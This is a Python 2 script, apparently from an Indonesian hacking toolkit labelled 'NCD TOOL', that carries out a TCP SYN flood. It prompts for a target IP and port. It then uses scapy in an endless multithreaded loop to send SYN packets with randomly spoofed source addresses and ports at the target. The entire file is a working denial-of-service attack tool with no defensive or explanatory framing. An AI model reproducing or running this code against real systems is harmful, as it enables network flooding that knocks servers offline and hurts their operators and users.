#!/usr/bin/env python
#NCD TOOL
#TCP SYN FLOODING (AS ROOT) 
#PYSCAPY REQUIRED TIDAK SUPPORT TERMUX

import socket, random, sys, threading
from scapy.all import *

#url = raw_input("Victim : ")
target = raw_input('IP Target : ')
port = int(raw_input("Port : "))
'''if url.count("/")==2:
	url = url + "/"
m = re.search('(https?\://)?([^/]*)/?.*', url)
host = m.group(2)
target = socket.gethostbyname(host)'''


total = 0

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		global randomip
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		randomip = i.src
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		randomport = t.sport
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

		print "{0}:{1} --> {2}:{3}".format(randomip,randomport,target,port)

print "Flooding %s:%i with SYN packets." % (target, port)
while True:
	sendSYN().start()